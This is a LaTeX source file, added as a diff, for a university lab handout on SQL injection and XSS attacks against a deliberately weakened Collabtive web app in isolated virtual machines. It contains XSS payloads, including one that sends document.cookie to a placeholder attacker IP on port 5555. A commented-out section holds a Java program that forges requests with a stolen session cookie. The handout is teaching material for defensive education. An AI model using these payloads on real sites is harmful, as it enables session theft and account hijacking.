@@ -1,0 +1,716 @@
+\input{header}
+
+\documentclass{article} 
+%\usepackage{fancyhdr}
+\usepackage{graphicx}
+\usepackage{color}
+\usepackage[latin1]{inputenc}
+%\usepackage{lgrind}
+%\input {highlight.sty}
+
+\lhead{\bfseries CS482 %SEED Labs -- 
+SQL and XSS Attack 
+Lab -- AY172}
+
+
+\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}
+
+\begin{document}
+
+\begin{center}
+{\LARGE Web Attacks
+%Attack
+Lab\\}
+\textbf{35 Points--Group Lab }\\
+\textbf{Due Date: Lesson 16}
+\end{center}
+
+\copyrightnoticeA
+
+\section{Overview}
+\subsection{SQL Overview}
+
+SQL injection is a code injection technique that exploits the 
+vulnerabilities in the interface between web applications and 
+database servers. The vulnerability is present when user's inputs 
+are not correctly checked within the web applications 
+before sending to the back-end database servers.
+
+Many web applications take inputs from users, and then use these
+inputs to construct SQL queries, so the web applications
+can pull the information out of the database. 
+Web applications also use SQL queries to store information in
+the database. These are common practices in the development of web applications.
+When the SQL queries are not carefully constructed, 
+SQL-injection vulnerabilities can occur. 
+SQL-injection attacks is one of the most frequent 
+attacks on web applications.
+
+\subsection{XSS Overview}
+
+Cross-Site Scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to inject malicious code (\emph{e.g.}, JavaScript programs) into a victim's web browser. Using this malicious code, the attackers can steal the victim's credentials, such as cookies. The access control policies (\emph{i.e.}, the same origin policy) employed by the browser to protect those credentials can be bypassed by exploiting the XSS vulnerabilities. Vulnerabilities of this kind can potentially lead to large-scale attacks. 
+
+\subsection{General Notes}
+For this lab, we will modify a web application called {\tt Collabtive},
+and disable several SQL countermeasures implemented by
+{\tt Collabtive} and modify the software to introduce an XSS vulnerability. This XSS vulnerability allows users to post any arbitrary message, including JavaScript programs, to the project introduction, message board, tasklist, milestone, timetracker and user profiles. As a result, we created a version of {\tt Collabtive}
+that is vulnerable to the SQL-Injection and XSS attacks. Although
+our modifications are artificial, they capture the common 
+mistakes made by many web developers. Students' goals in 
+this lab are to find ways to exploit the SQL-Injection and XSS
+vulnerabilities, demonstrate the damage that can 
+be achieved by the attacks, and master the 
+techniques that can help defend against such attacks.
+
+
+
+\section{Lab Environment Setup}
+\subsection{Network}
+%%%%MIKE MORE CONSISTENT WITH OTHER LABS
+You should start by loading up your three Ubuntu systems. Log in and verify the IP and MAC address of each. Write each system information below for future reference. Based on the set-up from lab 3 and lab 5, Attacker's IP should be 10.172.x.12, Victim should be 10.172.x.10, and Observer should be 10.172.x.11. The exploitable database and webserver are only on the Victim VM.
+
+\begin{verbatim}
+ VM1 (Attacker)    VM2 (Victim/Server)           VM3 (Observer)
+   IP: _____________       IP: _____________       IP: ______________
+          |                         |                        |
+          |_________________________|________________________|
+          |                  Virtual Switch                  |
+          |__________________________________________________|
+
+\end{verbatim}
+
+\textbf{DOUBLE CHECK YOUR LAB SET-UP BEFORE YOU GO FORWARD!}  
+
+\subsection{Domain names}
+There will be some modifications during the lab to get hosts to point to specific websites.  
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Other software}
+%Some of the lab tasks require some basic familiarity withJavaScript. We provide a sample JavaScript program {\tt HTTPSimpleForge} to assist with completing Task 4 of the XSS portion of the lab. Additionally, for task 3 of the XSS portion, we have
+%provided a C program {\tt echoserv.c} that can be configured to listen on a particular
+%port and display incoming messages. Both the Java and C programs should be downloaded 
+%from the web site and installed on your attacker's PC (VM1Client) before beginning the lab.
+This lab will walk through some basic JavaScript commands, but to complete this lab you may require some additional research. 
+%We provide a sample JavaScript program {\tt HTTPSimpleForge}
+%to assist with completing Task 4 of the XSS portion of the lab. 
+Additionally, for the XSS portion, we have
+provided a C program {\tt echoserv.c} that can be configured to listen on a particular
+port and display incoming messages.  Use will use the {\tt make} command with the provided MakeFile file to compile  {\tt echoserv.c} 
+%Both the Java and 
+The C program should be downloaded 
+from the web site and installed on your attacker's PC (VM1) before beginning the lab.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{comment}
+NO LONGER NEEDED
+
+
+\subsection{Turn Off SQL Countermeasure}
+PHP provides a mechanism to automatically defend against
+SQL injection attacks. The method is called magic quote, and more
+details will be introduced in Task 3 below. Let us turn off this 
+protection first on your victim PC (VM2Server). 
+\begin{enumerate}
+\item Go to \url{/etc/php5/apache2/php.ini}.
+\item Find the line: {\tt magic\_quotes\_gpc = On}. 
+\item Change it to this: {\tt magic\_quotes\_gpc = Off}. Note: there may be more than one location that must be changed.
+\item Restart the apache server by running
+{\tt "sudo service apache2 restart"}. 
+\end{enumerate}
+
+
+\end{comment}
+
+
+\section{Lab Tasks: SQL Injection}
+
+
+%\subsection{Task 1: SQL Injection Attack on {\tt SELECT} Statements}
+%\subsection{SQL Injection Attack on {\tt SELECT} Statements}
+
+In this task, you need to log into {\tt Collabtive}
+at \url{www.sqllabcollabtive.com}, without providing a password.   
+You can achieve this through an SQL injection attack. You can do all SQL tasks (\emph{i.e.}, this section) on the VM2 Server/Victim machine.  
+Normally, before users start using {\tt Collabtive}, they need to 
+login using their user names and passwords. 
+{\tt Collabtive} displays a login window to users and ask them to 
+input {\tt username} and {\tt password}.  The login window appears as follows:
+
+\begin{figure}[htb]
+        \centering
+        \includegraphics*[
+        width=.8\textwidth]{Figs/username.png}
+        \caption{Login Window}
+      \label{fig:logwin}
+\end{figure}
+
+
+
+The authentication is implemented by {\tt include/class.user.php} in the
+Collabtive root directory (\emph{i.e.}, {\tt /var/www/SQL/Collabtive/}).
+It uses the user-provided data to find out whether 
+they match with the {\tt username} and {\tt user\_password} fields of any record 
+in the database. If there is a match, it means the user has provided a correct 
+username and password combination, and should be allowed to login.
+Like most web applications, PHP programs interact with their back-end databases using the 
+standard SQL language. In {\tt Collabtive}, the SQL query in Figure \ref{fig:querysyn} is 
+constructed in {\tt class.user.php} to authenticate users.
+\begin{figure}
+\begin{Verbatim}[frame=single]
+  $sel1 = mysql_query ("SELECT ID, name, locale, lastlogin, gender, 
+     FROM  USERS_TABLE 
+     WHERE (name = '$user' OR email = '$user') AND pass = '$pass'");
+
+  $chk = mysql_fetch_array($sel1);
+
+  //if (found one record)
+  //then {allow the user to login}
+\end{Verbatim}
+\caption{Authentication Query}
+\label{fig:querysyn}
+\end{figure}
+
+In this SQL statement, the {\tt USERS\_TABLE} is a macro in PHP, and 
+will be replaced by the users table named {\tt user}. 
+The variable {\tt \$user} holds the string typed in the {\tt Username} textbox, 
+and {\tt \$pass} holds the string typed in the {\tt Password} textbox. 
+Users' inputs in these two textboxs are 
+placed directly in the SQL query string. 
+
+\paragraph{SQL Injection Attacks on Login:}
+There is an SQL-injection vulnerability 
+in the above query. Can you take advantage of this vulnerability to 
+achieve the following objectives?
+
+\begin{enumerate}
+%\item {\bf Task 1.1}:
+\item Can you log into another person's account without knowing the 
+      correct password?\\
+  HINT:
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html
+HINT 2: Valid usernames include: {\tt peter, alice, ted,} and {\tt bob}.
+
+\questionblock{\myquestion Provide the injection you used and evidence of its success}
+
+\item Why is it not possible to find a way to modify the database (still using the above SQL
+query)?  For example, can you add a new account to the database, or delete an 
+existing user account? Obviously, the above SQL statement is a query-only
+statement, and cannot update the database. However, using SQL injection,
+you can turn the above statement into two statements, with the second one
+being the update statement. Please try this method, and see whether you can
+successfully update the database.
+
+%To be honest, we are unable to achieve the update goal. 
+You will notice it fails.  
+This is because of
+a particular defense mechanism implemented in MySQL. In the report, you should show us what you
+have tried in order to modify the database. \\
+\questionblock{\myquestion Explain why the
+attack fails and what mechanism in MySQL has prevented such an attack. You may look up evidence (second-hand) from the Internet to support your conclusion. 
+However, a first-hand evidence will get more points (use your own
+creativity to find out first-hand evidence).
+If in case you find ways to succeed in the attacks,
+you will be awarded bonus points.
+
+HINT: Look at the {\tt mysql\_query()} inside of the {\tt class.user.php} file mentioned earlier (line 48).}
+
+\end{enumerate}
+
+\section{XSS Lab Tasks}
+First log in to the XSS website at: {\tt http://www.xsslabcollabtive.com} using your VM2 Server/Victim. User: {\tt alice} and password: {\tt alice}. Note that this page is similar to the SQL lab, but there have been some security bugs in the XSS web page implementation for this section of the lab.
+%\subsection{Task 1: Posting a Malicious Message to Display an Alert Window}
+\subsection{Posting a Malicious Message to Display an Alert Window}
+ The objective of this task is to embed a JavaScript program in your 
+{\tt Collabtive} profile, such that when another user views your profile, 
+the JavaScript program will be executed and an alert window
+will be displayed. The following JavaScript program will display an alert window: 
+\begin{Verbatim}
+    <script>alert('XSS');</script> 
+\end{Verbatim}
+If you embed the above JavaScript code in your profile (\emph{e.g.}, in the company
+field), then any user who views your profile will see the alert window. To get to your profile and edit the settings, please refer to the image below (Figure \ref{fig:inject}).  
+
+\questionblock{\myquestion Take a screenshot of a unique pop-up message as proof.}
+
+\begin{figure}
+        \centering
+        \includegraphics*[
+        width=1\textwidth]{Figs/profile.png}
+       \caption{Injecting User Edit Form}
+       \label{fig:inject}
+\end{figure}
+
+In the case of Figure \ref{fig:inject}, the JavaScript code is short enough to be typed into the 
+company field. If you want to run a long JavaScript, but you are limited
+by the number of characters you can type in the form, you can store the 
+JavaScript program in a standalone file, save it with the .js extension, and 
+then refer to it using the {\tt src} attribute in the {\tt <script>} tag. 
+See Figure \ref{fig:dom} for an example.
+%\todo{Verify that the type is necessary}
+\begin{figure}[ht]
+\begin{Verbatim}[frame=single]
+<script src="http://www.example.com/myscript.js"></script>
+\end{Verbatim}
+\caption{XSS to External Domain}
+\label{fig:dom}
+\end{figure}
+In Figure \ref{fig:dom}, the page will fetch the JavaScript program from
+\url{http://www.example.com}, which can be any web server. 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+For your next task, you will host a website on the attacker (VM1 Attacker) machine that will have a javascript page.  Your goal is to display some effect after navigating to the VM2 Server/Victim XSS {\tt Collabtive} site from VM3 Observer browser.  Bonus points may be awarded for creativity.  You will have to configure the apache web server and the file on the attacker with appropriate permissions.  You will also need to modify {\tt /etc/hosts} on the target VM2 Server/Victim and VM3 Observer so that your domain points to the attacker.  The alternative is to create a DNS infrastructure.  Appendix A explains how to do these configurations. \\
+%\item {\bf Task 4.1}: 
+%\item {\bf Task 1.1}: 
+
+\questionblock{\myquestion Provide a screenshot of your successfully applied attack in your final lab report along with a DETAILED description explaining what you were trying to achieve with your javascript, your processes, and what occured.}\\
+NOTE: Even when the code inject fails, it still looks like it worked because the browser will try to interpret the code as one of the existing scripts in its place.  Make sure at the very least your proof is a unique message.
+
+%\subsection{Task 2: Posting a Malicious Message to Display Cookies}
+\subsection{Posting a Malicious Message to Display Cookies}
+The objective of this task is to embed a JavaScript program in your 
+{\tt Collabtive} profile, such that when another user views your profile,
+that user's cookies will be displayed in the alert window.
+This can be done by adding some additional code to
+the JavaScript program in the previous task:
+
+\begin{Verbatim}
+     <script>alert(document.cookie);</script> 
+\end{Verbatim}
+
+Notice how your alert is now displaying the actual session's cookie information instead.\\
+
+\questionblock{\myquestion Provide a screenshot of your successfully applied attack for the {\tt alice} profile.  Log off and login as {\tt bob} (password is {\tt bob}).  In the upper right corner, view {\tt alice}'s profile.  If the inject was successful for under the {\tt alice} profile, you should now see {\tt bob}'s cookie.  Take a screenshot.  In your final lab report, describe what occured and explain your steps.\\}
+
+
+%\subsection{Task 3: Stealing Cookies from the Victim's Machine}
+\subsection{Stealing Cookies from the Victim's Machine}
+
+In the previous task, the malicious JavaScript code written by 
+the attacker can print out the
+user's cookies, but this only displays the cookies to the user, not the 
+attacker.  In this task, the attacker wants the JavaScript code 
+to send the cookies to himself/herself.
+To achieve this, the malicious JavaScript code needs to 
+send an HTTP request to the attacker, with the cookies appended to 
+the request. 
+
+We can do this by having the malicious JavaScript insert an {\tt $<$img$>$} tag with
+its {\tt src} attribute set to the attacker's machine IP address.  First, we establish a listening post service on the attacker using the {\tt echoserv.c} code.  NOTE: The TCP server program ({\tt echoserv.c}) is available on the course web site. Please download this program into your second Ubuntu VM to act as the attacker (VM1Client). Compile (there is a MakeFile in the unzipped directory, type the command {\tt make}) to compile.  Run the program so that it is listening on port 5555 (see Figure \ref{fig:eserv}).\\ 
+\indent Next, on the victim we will craft an inject that will send the cookie information to the listening post.   
+When the JavaScript inserts
+the {\tt img} tag, the browser tries to load the image from the URL in
+the {\tt src} field; this results in an HTTP GET request sent to the attacker's
+machine. The
+JavaScript in Figure \ref{fig:cookie} sends the cookies to the port 5555 of the
+attacker's machine, where the attacker has the echoserver listening. The echoserver can then process whatever it receives, printing the cookie information.  (Enter the command in Figure \ref{fig:cookie} with no whitespace) 
+
+\begin{figure}
+{\footnotesize
+\begin{Verbatim}[frame=single] 
+ <script>document.write('<img src=http://attacker_IP_address:5555?c=' 
+                                  + escape(document.cookie) + `>'); 
+ </script> 
+\end{Verbatim}
+}
+\caption{Stealing the Cookie}
+\label{fig:cookie}
+\end{figure}
+%Note: if you forgot how to compile and run a program, please refer to the DNS Attack lab for an example. There is an example document included with the server on how to test its operation.
+
+WARNING: If you have your firewall still enabled, this will not work! Check to ensure you have disabled it before continuing the task: {\tt sudo ufw status}. 
+
+A correct example of execution and a resulting cookie capture by the attacker machine is shown in Figure \ref{fig:eserv} for reference.\\
+
+\begin{figure}[htb]
+        \centering
+        \includegraphics*[
+        width=1\textwidth]{Figs/echoserv171.png}
+        \caption{Echoserver}
+        \label{fig:eserv}
+\end{figure}
+%\item {\bf Task 3.1}: 
+
+\questionblock{\myquestion  
+Provide a screenshot of your successfully captured session ID along with a description explaining your processes and what occured.\\}
+
+\begin{comment}
+\subsection{Task 4: Session Hijacking using the Stolen Cookies}
+
+After stealing the victim's cookies, the attacker can do whatever the victim
+can do to the {\tt Collabtive} web server, including creating a new project 
+on behalf of the victim, deleting the victim's post, etc. Essentially, 
+the attack has hijacked the victim's session. 
+In this task, we will launch this session hijacking attack, and
+write a program to create a new project on behalf of the victim. 
+The attack should be launched from the attacker's virtual machine.
+
+To forge a project, we should first find out how a legitimate 
+user creates a project in {\tt Collabtive}. More specifically, we need to figure out what is sent to the server when a user 
+creates a project. Firefox's {\tt LiveHTTPHeaders} extension can help us; it 
+can display the contents of any HTTP request message sent 
+from the browser. From the contents, we can identify all the parameters required in a request, which we will then forge using the provided {\tt HTTPSimpleForge} java program.
+
+Note: The {\tt LiveHTTPHeaders} is already installed in the pre-built Ubuntu VM image. 
+
+
+
+{\footnotesize
+\begin{Verbatim}[frame=single]
+http://victim_IP_address/collabtive/admin.php?action=addpro
+
+POST /admin.php?action=addpro HTTP/1.1
+Host: victim_IP_address
+User-Agent: Mozilla/5.0 (X11;  Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive
+Referer: http://victim_IP_address/collabtive/index.php
+Cookie: PHPSESSID=......
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 110
+name=<Content of the message>
+
+
+
+HTTP/1.1 302 Found
+Date: Fri, 22 Jul 2011 19:43:15 GMT
+Server: Apache/2.2.17 (Ubuntu)
+X-Powered-By: PHP/5.3.5-1ubuntu7.2
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Expires: 0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 26
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=utf-8
+\end{Verbatim}
+}
+
+Once we have understood what the HTTP request for project creation
+looks like, we can write a Java program to send out the 
+same HTTP request. The {\tt Collabtive} server cannot distinguish whether 
+the request is sent out by the user's browser or by the attacker's
+Java program. As long as we set all the parameters correctly,
+and the session cookie is attached, the server will accept and process the 
+project-posting HTTP request.
+To simplify your task, we provide you with a sample java program {\tt HTTPSimpleForge.java}that does the 
+following:
+
+\begin{enumerate}
+\item Open a connection to web server.
+\item Set the necessary HTTP header information.
+\item Send the request to web server.
+\item Get the response from web server. 
+\end{enumerate}
+
+{\footnotesize
+\begin{Verbatim}[frame=single]
+import java.io.*;
+import java.net.*;
+
+public class HTTPSimpleForge {
+
+   public static void main(String[] args) throws IOException {
+   try {
+	int responseCode;
+	InputStream responseIn=null;
+	
+	// URL to be forged.
+	URL url = new URL ("http://victim_IP_address/collabtive/
+						admin.php?action=addpro");
+	
+	// URLConnection instance is created to further parameterize a 
+	// resource request past what the state members of URL instance 
+	// can represent.
+	URLConnection urlConn = url.openConnection();
+	if (urlConn instanceof HttpURLConnection) {
+		urlConn.setConnectTimeout(60000);
+		urlConn.setReadTimeout(90000);
+	}
+		
+	// addRequestProperty method is used to add HTTP Header Information.
+	// Here we add User-Agent HTTP header to the forged HTTP packet.
+        // Add other necessary HTTP Headers yourself. Cookies should be stolen
+	// using the method in task3.
+	urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
+	
+	//HTTP Post Data which includes the information to be sent to the server.
+	String data="name=test&desc=test...&assignto[]=...&assignme=1";
+		
+	// DoOutput flag of URL Connection should be set to true 
+	// to send HTTP POST message.
+	urlConn.setDoOutput(true);
+		
+	// OutputStreamWriter is used to write the HTTP POST data 
+	// to the url connection.        	
+        OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
+        wr.write(data);
+        wr.flush();
+
+	// HttpURLConnection a subclass of URLConnection is returned by 
+	// url.openConnection() since the url  is an http request.			
+	if (urlConn instanceof HttpURLConnection) {
+		HttpURLConnection httpConn = (HttpURLConnection) urlConn;
+		
+		// Contacts the web server and gets the status code from 
+		// HTTP Response message.
+		responseCode = httpConn.getResponseCode();
+		System.out.println("Response Code = " + responseCode);
+	
+		// HTTP status code HTTP_OK means the response was 
+		// received sucessfully.
+		if (responseCode == HttpURLConnection.HTTP_OK) {
+
+			// Get the input stream from url connection object.
+			responseIn = urlConn.getInputStream();
+			
+			// Create an instance for BufferedReader 
+			// to read the response line by line.
+			BufferedReader buf_inp = new BufferedReader(
+					new InputStreamReader(responseIn));
+			String inputLine;
+			while((inputLine = buf_inp.readLine())!=null) {
+				System.out.println(inputLine);
+			}
+		}
+	}
+     } catch (MalformedURLException e) {
+		e.printStackTrace();
+     }
+   }
+}
+\end{Verbatim}
+}
+
+If you have trouble understanding the above program, 
+we suggest you to read the following:
+
+\begin{itemize}
+\item JDK 6 Documentation: \url{http://java.sun.com/javase/6/docs/api/}
+\item Java Protocol Handler:\\ 
+\url{http://java.sun.com/developer/onlineTraining/protocolhandlers/}
+\end{itemize}
+
+Before you begin your final attack, there is one problem. The servers are locally hosted on each VM. That means the Session ID you just stole is from the victim's web server, not the one being hosted on your machine! We need to update our {\tt /etc/hosts} file on the attackers pc to actually attack the {\tt collabtive} server running on the victims PC. To do this, find the following line: 
+
+{\footnotesize
+\begin{Verbatim}[frame=single] 
+127.0.0.1   www.XSSLabCollabtive.com 
+\end{Verbatim}
+}
+Change the IP to reflect that of your victim. Save the document and restart networking.
+\newpage
+\subsection{Summary of Steps (some additional included for clarification):}
+\begin{enumerate}
+\item Change your /etc/hosts file so that the www.xsslabcollabtive.com points to the victim IP
+\item Restart network service using {\tt sudo service networking restart}
+\item In victim's browser, log in as alice, edit profile to create an XSS alert that reveals the profile cookie.
+\item enable cookie sniffer on attacker PC
+\item view alice's profile to generate XSS cookie stealing
+\item take the session ID from the stolen session  and implement it into your HTTPSimpleForge program. Note: your session/cookie ID is the part AFTER {\tt PHPSESSID\%3D} in your stolen cookie. Note that you can also use FireFox add-in Firebug to view the session ID on the victim's PC to verify.
+\item compile the HTTPSimpleForge program using: {\tt javac HTTPSimpleForge.java}
+\item Run your program using {\tt java HTTPSimpleForge}
+\item If your attack worked, you should get a Response Code = 200 as your first response along with a bunch of HTML displayed.
+\item Verify your attack worked by going into Alice's profile and viewing the task. If it didn't appear, even though you have the 200 Response code, likely culprits include: Did you use correct cookie ID? Did you change your /etc/hosts to point to victim?
+\end{enumerate}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%\subsection{Task 5: Countermeasures}
+\subsection{Countermeasures}
+{\tt Collabtive} does have a built-in countermeasure 
+to defend against XSS attacks. We have commented out 
+the countermeasure to simplify the attack. 
+Please open {\tt include/initfunctions.php}
+and find the {\tt getArrayVal()} function. 
+
+\begin{Verbatim}[frame=single]
+   We have replaced the following line:
+      return strip_only_tags($array[$name], "script");
+   with:
+      return ($array[$name]);
+\end{Verbatim}
+
+Please describe why the function {\tt strip\_only\_tags} can make XSS 
+attacks more difficult. Please read the article~\cite{samy} by the author 
+of the Samy Worm and see how he bypassed the similar 
+countermeasures initially implemented in {\tt MySpace}. 
+Please try his approaches and see whether you can defeat the 
+{\tt Collabtive}'s countermeasure.
+\end{comment}
+
+
+\section{Submission requirements}
+
+\subsection{Rubric}
+\begin{enumerate}
+\item SQL Q1) 2 pts
+\item SQL Q2) 3 pts
+\item XSS Q3) 5 pts
+\item XSS Q4) 5 pts
+\item XSS Q5) 5 pts 
+\item XSS Q6) 5pts 
+\item Reflection 10 pts 
+\end{enumerate}
+
+
+\subsection{Partner Submission}
+Provide one written lab report, answering each question properly labelled with the number and original question, per partner team. Be sure to include the time spent on the lab and document any external resources used. 
+Again good documentation: 
+\begin{enumerate}
+\item clearly enumerates tasks with a description of you did and evidence.  
+\item shows the progress you were able to achieve.
+\item explains your troubleshooting attempts.
+\item accurately describes an issue and the potential solution (if really good, I will give near full credit).
+\end{enumerate}
+
+
+\subsection{Individual Submission}
+Each member needs to submit a detailed lab reflection. This includes 
+\begin{itemize}
+\item approximately one half page that describes the common fundamental weakness between SQL injections and XSS attacks.  Use key terms from Chapter 2. 
+\item any challenging points or thoughts on what you found interesting during the lab 
+\item time spent you personally spent and how much effort you put forth
+\item time your partner spent, and how much effort they put forth
+\item be sure document any external resources used. 
+\end{itemize}
+
+
+
+\newpage
+\appendix
+
+\section{Web Pentest Environment Configurations} 
+\label{sec:cheatsheet}
+
+In this lab, we needed three things to conduct our attacks: (1) the Firefox web browser,
+(2) the Apache web server, and (3) the {\tt Collabtive} project management
+web application. These were already setup on your VM. However, if you were looking to do something similar, the following are the basic configuration changes that were done in order to create the local web SQL and XSS pentest environment.
+
+\begin{comment}
+
+
+
+
+\subsection{Starting the Apache Server.}
+The Apache web server is also included in the pre-built \ubuntu
+image. 
+%However, the web server is not started by default.
+%You need to first start the web server using the
+%following command:
+However, the web server should be started by default.
+To start it:
+%following command:
+\begin{verbatim}
+   % sudo service apache2 start
+\end{verbatim}
+
+Additionally, we needed to use the \texttt{LiveHTTPHeaders} extension for Firefox to
+inspect the HTTP requests and responses. The pre-built \ubuntu
+VM image provided to you has already installed the Firefox web browser with the
+required extensions. If you were setting up a new environment, these would need to be installed.
+
+\end{comment}
+
+\subsection{The {\tt Collabtive} Web Application.}
+We use an open-source web application called {\tt Collabtive} in this lab.
+{\tt Collabtive} is a web-based project management 
+system.  This web application is already set up in the 
+pre-built \ubuntu VM image. 
+If you want to try it yourself, here is a detailed online
+tutorial on how to install {\tt Collabtive} and configure its
+database. Additionally, there are many other similar platforms out there, such as: {\tt phpbb}, {\tt Elgg} and {\tt DVWA}.
+
+
+\subsection{Configuring hostname/domain name lookup without DNS.}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsubsection{Modify {\tt hosts} Records}
+We will need to modify each \texttt{/etc/hosts} file per the the table below to create a mapping between 
+domain names and the appropriate web server's IP address. The \texttt{/etc/hosts}  lookup preempts any DNS query, eliminating the need for a dedicated DNS server.  
+
+\begin{table}[ht]
+\centering
+\label{my-label}
+\begin{tabular}{|l|l|l|l|}
+\hline
+\textbf{URL/Website}                        & \textbf{Containing Host} & \textbf{IP Mapping} & \textbf{hosts files to be modified} \\ \hline
+www.xsslabcollabtive.com                    & Victim/Server            & 10.172.X.10         & Observer, Attacker                  \\ \hline
+www.sqllabcollabtive.com                    & Victim/Server            & 10.172.X.10         & Observer, Attacker                  \\ \hline
+\textless your malicious domains\textgreater & Attacker                 & 10.172.X.12         & Observer, Victim/Server             \\ \hline
+\end{tabular}
+\end{table}
+
+To make these changes take effect:
+\begin{Verbatim}
+sudo service networking restart
+\end{Verbatim}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsubsection{Configuring Apache Server.}
+%In the pre-built VM image, we use Apache server to host all the web sites used in the lab. 
+The name-based virtual hosting feature in
+Apache can be used to host several web sites (or URLs) on the same
+machine. A configuration file named {\tt 000-default.conf} in the directory
+\url{/etc/apache2/sites-available} contains the necessary directives for the
+configuration:
+
+\begin{enumerate}
+% NOT NECESSARY 
+%\item The directive {\tt "NameVirtualHost *"} instructs the web server to use all IP addresses in the machine (some machines may have multiple IP addresses).
+
+\item Each web site has a {\tt VirtualHost} block that specifies the
+  URL for the web site and directory in the file system that contains
+  the sources for the web site. For example, to configure a web site
+  with URL \url{http://www.example1.com} with sources in directory
+  \url{/var/www/Example_1/}, and to configure a web site
+  with URL \url{http://www.example2.com} with sources in directory
+  \url{/var/www/Example_2/},
+  we use the following blocks:
+
+\begin{Verbatim}[frame=single]
+<VirtualHost *>
+    ServerName http://www.example1.com
+    DocumentRoot /var/www/Example_1/
+</VirtualHost>
+
+<VirtualHost *>
+    ServerName http://www.example2.com
+    DocumentRoot /var/www/Example_2/
+</VirtualHost>
+\end{Verbatim}
+
+\item You may create or modify the web content of your new sites by accessing the source files in the
+mentioned directories. For example, with the above configuration,
+the web application \url{http://www.example1.com} can be changed by modifying
+the sources in the directory \url{/var/www/Example_1/}.
+
+
+
+\item Reload/Resart you configuration files.  You can implement the changes you made to {\tt 000-default.conf} by issuing
+
+\begin{Verbatim}
+sudo service apache2 reload
+\end{Verbatim}
+
+Alternatively, you may find it necessary to restart the entire service: 
+
+\item Verification.  You can verify your service is properly loaded with the new websites by issuing the following command: 
+\begin{Verbatim}
+sudo apache2ctl -S
+\end{Verbatim}
+%\todo{screen shot this command!}
+\begin{figure}[htb]
+        \centering
+        \includegraphics*[
+        width=1\textwidth]{Figs/actl.png}
+        \caption{apache2ctl}
+        \label{fig:actl}
+\end{figure}
+\end{enumerate}
+\end{document}
